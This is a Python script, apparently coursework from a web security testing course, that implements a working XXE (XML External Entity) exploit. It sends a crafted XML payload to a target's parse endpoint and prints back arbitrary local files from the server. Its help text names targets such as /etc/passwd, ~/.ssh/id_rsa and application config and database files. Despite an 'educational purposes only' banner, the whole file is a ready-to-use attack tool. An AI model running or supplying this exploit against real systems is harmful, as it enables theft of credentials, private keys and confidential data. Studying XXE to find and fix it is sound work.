#!/usr/bin/env python3
"""
XXE File Disclosure Exploit
===========================

This script demonstrates XXE (XML External Entity) vulnerability
by reading arbitrary files from the target server.

EDUCATIONAL PURPOSES ONLY!
Do not use against systems you don't have permission to test.

Author: Adrian Kapczynski
Course: Web and Mobile Application Security Testing
"""

import requests
import sys
import argparse
import json
from urllib.parse import urljoin


class XXEFileDisclosure:
    """
    XXE exploit for reading local files from vulnerable XML parsers
    """

    def __init__(self, target_url, verbose=False):
        """
        Initialize the exploit

        Args:
            target_url (str): Base URL of the vulnerable application
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.verbose = verbose
        self.endpoint = urljoin(target_url, '/api/parse')  # Use API endpoint

    def log(self, message):
        """Print message if verbose mode is enabled"""
        if self.verbose:
            print(f"[*] {message}")

    def create_xxe_payload(self, file_path):
        """
        Create XXE payload for file disclosure

        Args:
            file_path (str): Path to the file to read

        Returns:
            str: XML payload with external entity
        """
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<data>&xxe;</data>"""
        return payload

    def exploit(self, file_path):
        """
        Execute the XXE exploit to read a file

        Args:
            file_path (str): Path to the file to read

        Returns:
            tuple: (success: bool, content: str)
        """
        self.log(f"Target: {self.target_url}")
        self.log(f"Endpoint: {self.endpoint}")
        self.log(f"File to read: {file_path}")

        # Create payload
        payload = self.create_xxe_payload(file_path)
        self.log("Payload created")

        if self.verbose:
            print("\n" + "=" * 60)
            print("PAYLOAD:")
            print("=" * 60)
            print(payload)
            print("=" * 60 + "\n")

        try:
            # Send POST request with proper headers
            self.log("Sending exploit...")

            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'XXE-Exploit/1.0'
            }

            response = requests.post(
                self.endpoint,
                data={'xml_content': payload},
                headers=headers,
                timeout=10,
                allow_redirects=True
            )

            self.log(f"Response status: {response.status_code}")

            # Check if successful
            if response.status_code == 200:
                try:
                    # Parse JSON response from API
                    json_data = response.json()

                    if json_data.get('success'):
                        # Extract file content
                        parsed_data = json_data.get('parsed_data', {})

                        # Try to get content from text_content
                        content = parsed_data.get('text_content', '')

                        if not content:
                            # Try xml_string as fallback
                            content = parsed_data.get('xml_string', '')

                        if content and content.strip():
                            return True, content
                        else:
                            return False, "File read but content is empty or file doesn't exist"
                    else:
                        error_msg = json_data.get('error', 'Unknown error')
                        return False, f"Server returned error: {error_msg}"

                except json.JSONDecodeError:
                    return False, "Could not parse JSON response"
            else:
                return False, f"Request failed with status {response.status_code}"

        except requests.exceptions.RequestException as e:
            return False, f"Request error: {str(e)}"


def print_banner():
    """Print exploit banner"""
    banner = """
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║           XXE File Disclosure Exploit                     ║
║           Local File Read via XML External Entity         ║
║                                                           ║
║           [!] EDUCATIONAL PURPOSES ONLY [!]              ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
    """
    print(banner)


def main():
    """Main function"""
    print_banner()

    # Parse arguments
    parser = argparse.ArgumentParser(
        description='XXE File Disclosure Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python file_disclosure.py -t http://localhost:5000 -f /etc/passwd
  python file_disclosure.py -t http://localhost:5000 -f /etc/hosts -v
  python file_disclosure.py --target http://localhost:5000 --file sensitive_data.txt --verbose

Common files to test:
  Linux/Mac:
    /etc/passwd
    /etc/hosts
    /etc/hostname
    ~/.ssh/id_rsa

  Application specific:
    /Users/yourname/path/to/sensitive_data.txt
    ./config.ini
    ./database.conf
        """
    )

    parser.add_argument(
        '-t', '--target',
        required=True,
        help='Target URL (e.g., http://localhost:5000)'
    )

    parser.add_argument(
        '-f', '--file',
        required=True,
        help='File path to read (e.g., /etc/passwd)'
    )

    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose output'
    )

    args = parser.parse_args()

    # Create exploit instance
    exploit = XXEFileDisclosure(args.target, verbose=args.verbose)

    # Run exploit
    print(f"\n[+] Targeting: {args.target}")
    print(f"[+] Reading file: {args.file}")
    print("[+] Launching exploit...\n")

    success, result = exploit.exploit(args.file)

    # Display results
    if success:
        print("=" * 60)
        print("✅ EXPLOIT SUCCESSFUL!")
        print("=" * 60)
        print("\nFILE CONTENT:")
        print("-" * 60)
        print(result)
        print("-" * 60)
        print(f"\n[+] Successfully read {len(result)} bytes via XXE vulnerability!")
    else:
        print("=" * 60)
        print("❌ EXPLOIT FAILED")
        print("=" * 60)
        print(f"\nError: {result}")
        print("\n[!] Possible reasons:")
        print("  - File doesn't exist")
        print("  - No read permissions")
        print("  - Target not vulnerable")
        print("  - Wrong target URL")
        print("  - Target application not running")
        sys.exit(1)


if __name__ == '__main__':
    main()